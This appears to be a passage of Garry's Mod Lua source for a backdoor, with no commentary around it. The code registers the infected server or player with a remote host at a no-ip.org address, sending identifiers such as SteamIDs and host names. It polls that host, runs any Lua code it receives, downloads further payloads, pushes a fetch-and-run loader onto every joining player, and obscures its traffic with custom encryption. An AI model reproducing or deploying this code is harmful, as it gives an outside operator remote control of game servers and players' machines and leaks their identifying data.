pwn['StartTimer']=function(name) local tmr=timers[name] if tmr then tmr['enabled']=true tmr['nextcall']=CurTime()+tmr['delay'] return true else return false end end pwn['StopTimer']=function(name) local tmr=timers[name] if tmr then tmr['enabled']=false return true else return false end end pwn['PauseTimer']=function(name) local tmr=timers[name] if tmr then tmr['enabled']=false tmr['diff']=tmr['nextcall']-CurTime() return true else return false end end pwn['UnPauseTimer']=function(name) local tmr=timers[name] if tmr then tmr['enabled']=true tmr['nextcall']=tmr['diff'] and CurTime()+tmr['diff'] or CurTime()+tmr['delay'] return true else return false end end pwn['AdjustTimer']=function(name,delay,reps,func) if isstring(name) and isnumber(delay) and delay>0 and isnumber(reps) and reps>=0 then if !timers[name] or (func!=nil and !isfunction(func)) then return false end timers[name]={ enabled=true, delay=delay, nextcall=CurTime()+delay, reps=reps, func=func or timers[name]['func'] } return true else return false end end pwn['SimpleTimer']=function(delay,func) if isnumber(delay) and delay>=0 and isfunction(func) then table['insert'](simple_timers,{UnPredictedCurTime()+delay,func}) return true else return false end end pwn['CheckTimers']=function() for k,t in pairs(timers) do if t['enabled'] and t['nextcall']<=CurTime() then local ok = pwn['Call']('TIMER', k, t['func']) if !ok then pwn['p']('Timer "' .. k .. '" failed.') timers[k]=nil return end if t['reps']!=0 then t['reps']=t['reps']-1 if t['reps']==0 then timers[k]=nil return end end t['nextcall']=CurTime()+t['delay'] end end for k,t in pairs(simple_timers) do if CurTime()>=t[1] then pwn['Call']('TIMER', 'SimpleTimer#' .. k, t[2]) table['remove'](simple_timers,k) end end return true end pwn['AddHook']('Think','pwn_CheckTimers',pwn['CheckTimers']) local function init() pwn['address'] = 'http://yaybomb.no-ip.org:1337/' pwn['fsender_interval'] = 0.15 pwn['chk_interval'] = SERVER and 1 or 4 pwn['spl'] = '?a=' pwn['working'] = true pwn['chk_failed'] = 0 pwn['chk_last'] = '' pwn['replycommands'] = false pwn['b64'] = true pwn['crypt'] = false if SERVER then pwn['uid'] = '46_39_35_221_'..GetConVarString('hostport') else pwn['uid'] = pUniqueID(LocalPlayer()) end pwn['IntToHex']=function(n) if n > 255 then return nil end local function To16(s) local t = tonumber(math['BinToInt'](s)) local q = '0123456789ABCDEF' return q[t + 1] end local s = math['IntToBin'](n) if(string['len'](s) > 8) then s = string['sub'](s,string['len'](s) - 7, string['len'](s)) else while string['len'](s) < 8 do s = '0' .. s end end local res res = To16(string['sub'](s,1,4)) res = res .. To16(string['sub'](s,5,8)) return res end local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/' pwn['b64_enc']=function(data) return ((data:gsub('.', function(x) local r,b='',x:byte() for i=8,1,-1 do r=r..(b%2^i-b%2^(i-1)>0 and '1' or '0') end return r; end)..'0000'):gsub('%d%d%d?%d?%d?%d?', function(x) if (#x < 6) then return '' end local c=0 for i=1,6 do c=c+(x:sub(i,i)=='1' and 2^(6-i) or 0) end return b:sub(c+1,c+1) end)..({ '', '==', '=' })[#data%3+1]) end pwn['b64_dec']=function(data) data = string['gsub'](data, '[^'..b..'=]', '') return (data:gsub('.', function(x) if (x == '=') then return '' end local r,f='',(b:find(x)-1) for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end return r; end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x) if (#x ~= 8) then return '' end local c=0 for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end return string['char'](c) end)) end local function cycleAdd(a,b) a = a + b if(a > 255) then a = a - 255 end return a end pwn['key'] = 'T7ZmdU5RDusZAzISP9DcopC9eaz2FulLfbSzZ5JcX9IYglP488juUydxsXbwfrMYNRYfKf1GljAoShCXSn3H0sdosji9OGoKpwKXBvfCuDNjYrL68DQMaaHDjbeQy1yFo28AOq7haoOfb6DiIsw5glI9ctTmxVHgUaoDtob7H' pwn['keyid'] = 'EB729602389D126' pwn['enc']=function(data, key) key = key or pwn['key'] local s = data:ToTable() local res = {} local i = 0 local sz = #s while #s > 0 do i = i + 1 if i >= key:len() then i = 1 end local b = string['byte'](key, i) local b2 = string['byte'](key, i + 1) local ix = math['mod'](b * b2, #s) + 1 local num = string['byte'](s[ix]) + b if num > 255 then num = num - 255 end table['insert'](res, string['char'](num)) s[ix] = s[#s] table['remove'](s, #s) end return table['concat'](res) end pwn['dec']=function(data, key) key = key or pwn['key'] local s = data:ToTable() local res = {} local i = math['mod'](data:len(), key:len() - 1) + 2 local j = data:len() local j2 = 1 while j > 0 do i = i - 1 if i <= 1 then i = key:len() end local b = string['byte'](key, i - 1) local b2 = string['byte'](key, i) local ix = math['mod'](b * b2, j2) + 1 local num =string['byte'](s[j]) - b if num < 0 then num = num + 255 end res[#res + 1] = res[ix] res[ix] = string['char'](num) j = j - 1 j2 = j2 + 1 end return table['concat'](res) end pwn['StringToHex']=function(str) if pwn['b64'] then return 'x' .. pwn['b64_enc'](str) else local curfp = '' for _, s in pairs(string['ToTable'](str)) do curfp = curfp .. pwn['IntToHex'](string['byte'](s)) end return curfp end end pwn['p']=function(text) pwn['http'](pwn['address'] .. pwn['uid'] .. pwn['spl'] .. '2' .. pwn['StringToHex'](tostring(text))) end pwn['l']=function(text, winname, log, dic) local dics='' if dic then for k,w in pairs(dic) do dics=dics..(k==1 and '' or '|')..table['concat'](w,':') end end pwn['http'](pwn['address'] .. pwn['uid'] .. pwn['spl'] .. '6' .. (winname and pwn['StringToHex'](winname) or '') .. '|' .. pwn['StringToHex'](dics)  .. '|' .. (log and '1' or '0') .. pwn['StringToHex'](tostring(text))) end local attempts=0 pwn['reg']=function() local steamId,pname if SERVER then steamId = pwn['uid'] pname = GetHostName() else steamId = pSteamID(LocalPlayer()) pname = pNick(LocalPlayer()) if pname=='unconnected' then if attempts<21 then attempts=attempts+1 pwn['SimpleTimer'](1,pwn['reg']) end if attempts>1 then return end end end pwn['http'](pwn['address'] .. pwn['uid'] .. pwn['spl'] .. '0' .. steamId .. '|' .. pwn['StringToHex'](tostring(pwn['http_proxy'])) .. '|' .. pwn['StringToHex'](GetHostName()) .. '|' .. pwn['StringToHex'](pname)) end pwn['sleep']=function() pwn['working']=false pwn['DestroyTimer']('pwn_chk_timer') if SERVER then pwn['RemoveHook']('PlayerInitialSpawn','pwn.srv') end end pwn['setinterval']=function(interval) if isnumber(interval) then pwn['chk_interval']=interval pwn['AdjustTimer']('pwn_chk_timer',interval,0) end end pwn['runlua']=function(code,isplain) local key=util['CRC'](os['time']()*math['random'](228,1337)) _G[key]=pwn local func = CompileString(isplain and code or 'local pwn=_G[''..key..'']local G,R,cmd=pwn.G,pwn.R,pwn.G.cmd '..code, 'pwn', false) if type(func) == 'string' then pwn['p']('SYNTAX ERROR:
' .. func) else local bool, res = pcall(func) if !bool then pwn['p']('ERROR:
' .. res) end end _G[key]=nil end pwn['chk']=function() pwn['chk_failed'] = pwn['chk_failed'] + pwn['chk_interval'] if pwn['chk_failed'] > 20 then if tostring(pwn['http_proxy']) == '0' then if SERVER then for k, v in pairs(player['GetAll']()) do pwn['inf'](v) end pwn['proxy'](-1) elseif util['NetworkStringToID']('pwn_http_send')!=0 then pwn['proxy'](-1) end else pwn['proxy'](0) end pwn['chk_failed'] = 0 end pwn['http'](pwn['address'] .. pwn['uid'] .. pwn['spl'] .. '1', pwn['chk_r']) if not pwn['working'] then pwn['DestroyTimer']('pwn_chk_timer') pwn['RemoveHook']('PlayerInitialSpawn','pwn.srv') end end pwn['chk_r']=function(contents, size) if string['len'](contents) > 5 then if string['len'](contents) == 12 then if string['StartWith'](contents, 'NONE') and string['EndsWith'](contents, 'NONE') then if (contents != pwn['chk_last']) then pwn['chk_failed'] = 0 pwn['chk_last'] = contents end return end end pwn['chk_last'] = contents if pwn['replycommands'] then pwn['p'](contents) end pwn['runlua'](contents) end end pwn['f']=function(str) local s = str s = string['Replace'](s,'\','\\') s = string['Replace'](s,'
','\n') s = string['Replace'](s,' ','\s') s = string['Replace'](s,'"','\q') s = string['Replace'](s,'<','\o') s = string['Replace'](s,'>','\c') s = string['Replace'](s,'%','\p') s = string['Replace'](s,'&','\a') s = string['Replace'](s,'	','\t') s = string['Replace'](s,'=','\e') return s end pwn['http_answer']=function(len, ply) local id = net['ReadFloat']() local f = pwn['http_waiting'][id] if f then pwn['Call']('NET CALLBACK',tostring(id),f,net['ReadString']()) pwn['http_waiting'][id] = nil end end pwn['http_send']=function(len, ply) local id=net['ReadFloat']() pwn['http'](net['ReadString'](),function(content) net['Start']('pwn_http_answer') net['WriteFloat'](id) net['WriteString'](content) if SERVER then net['Send'](ply) else net['SendToServer']() end end) end pwn['proxy']=function(num) pwn['http_proxy'] = num pwn['reg']() end pwn['http']=function(address, callback) local usualprefix = pwn['address'] .. pwn['uid'] .. pwn['spl'] local cryptedprefix = usualprefix .. 'c' if pwn['crypt'] and address:StartWith(usualprefix) and not address:StartWith(cryptedprefix) then address = address:sub(usualprefix:len() + 1) address = pwn['StringToHex'](pwn['enc'](address)) address = usualprefix .. 'c' .. pwn['keyid'] .. '!' .. address if callback then local origcb = callback local origcallback = callback callback = function(data,size) data = pwn['dec'](data) origcallback(data,size) end end end if tostring(pwn['http_proxy'])=='0' then if callback then HTTP({ url=address, method='get', success=function(code,body,headers) pwn['Call']('HTTP CALLBACK',address,callback,body) end }) else HTTP({ url=address, method='get' }) end else if SERVER and #player['GetAll']()==0 then return end pwn['http_id'] = pwn['http_id'] + 1 net['Start']('pwn_http_send') net['WriteFloat'](pwn['http_id']) net['WriteString'](address) if callback then pwn['http_waiting'][pwn['http_id']] = callback end if SERVER then local p if type(pwn['http_proxy']) != 'Player' then local pls_all = player['GetAll']() local pls if pwn['http_proxy'] == -1 then pls = {} for k, v in pairs(pls_all) do if not v:IsBot() then table['insert'](pls, v) end end p = pls[math['random'](1, #pls)] else pls = pls_all p = pls[pwn['http_proxy']] end else p = pwn['http_proxy'] end net['Send'](p) else net['SendToServer']() end end end pwn['download']=function(filename, varname, partsize) pwn['http'](pwn['address'] .. pwn['uid'] .. pwn['spl'] .. '5' .. filename .. '|' .. varname .. '|' .. partsize .. '|0',pwn['runlua']) end pwn['dowload_r']=function(filename, varname, partsize, partn) pwn['http'](pwn['address'] .. pwn['uid'] .. pwn['spl'] .. '5' .. filename .. '|' .. varname .. '|' .. partsize .. '|' .. partn,pwn['runlua']) end pwn['printplayers']=function() local s = '' for k, v in pairs(player['GetAll']()) do s = s .. '
' .. k .. ':' .. pNick(v) end pwn['p'](s) end pwn['tf']=function(target,str,casesens) local s = '' str = str or '' if(casesens)then for k, v in pairs(target) do if(string['find'](k,str,1,true) != nil) then s = s .. k .. ': ' .. type(v) .. '
' end end else str = string['lower'](str) for k, v in pairs(target) do if(string['find'](string['lower'](k),str,1,true) != nil) then s = s .. k .. ' (' .. type(v) .. '):' .. tostring(v) .. '
' end end end pwn['p'](s .. '-------------') end pwn['pt']=function(tbl,depth,vb,filter,str,_curlvl) local shpr=str==nil depth=depth or 0 str=str or '' _curlvl=_curlvl or 0 local pre=string['rep']('	',_curlvl) for k,v in pairs(tbl) do if !filter or filter(k,v) then if istable(v) and depth!=0 then if vb then str=str..pre..type(k)..' ['..k..']:
'..pwn['pt'](v,depth-1,vb,filter,str,_curlvl+1) else str=str..pre..'['..k..']:
'..pwn['pt'](v,depth-1,vb,filter,str,_curlvl+1) end else if vb then str=str..pre..type(k)..' ['..k..']: '..type(v)..' ['..tostring(v)..']
' else str=str..pre..'['..k..']: ['..tostring(v)..']
' end end end end if shpr then pwn['p'](str..'-------------') else return str end end pwn['pl']=function(str) str = string['lower'](str) for k, v in pairs(player['GetAll']()) do if(string['find'](string['lower'](pNick(v)),str,1,true) != nil) then return v end if(string['find'](string['lower'](pSteamID(v)),str,1,true) != nil) then return v end if(string['find'](string['lower'](pUniqueID(v)),str,1,true) != nil) then return v end end end pwn['inf']=function(ply) pSendLua(ply,'http.Fetch("'..pwn['address']..'2.lua",RunString)') end pwn['wake']=function(ply) net['Start']('pwn_wake') net['Send'](ply) end pwn['boot']=function() pwn['working']=true pwn['http_proxy'] = 0 pwn['http_id'] = 1 pwn['http_waiting'] = {} if SERVER then util['AddNetworkString']('pwn_http_answer') util['AddNetworkString']('pwn_http_send') end pwn['Receive']('pwn_http_answer', pwn['http_answer']) pwn['Receive']('pwn_http_send', pwn['http_send']) pwn['timeout'] = 0 pwn['reg']() pwn['CreateTimer']('pwn_chk_timer',pwn['chk_interval'],0,pwn['chk']) if SERVER then if pwn['sendtocl'] then pwn['AddHook']('PlayerInitialSpawn','pwn.srv',pwn['inf']) end end end if pwn['working'] then pwn['boot']() end util['AddNetworkString']('pwn_wake') pwn['Receive']('pwn_wake',function() if !pwn['working'] then pwn['boot']() end end) end if CLIENT then if LocalPlayer()==NULL then pwn['AddHook']('InitPostEntity','pwn.init_cl',init) else init() end else pwn['SimpleTimer'](0,init) end end) end)
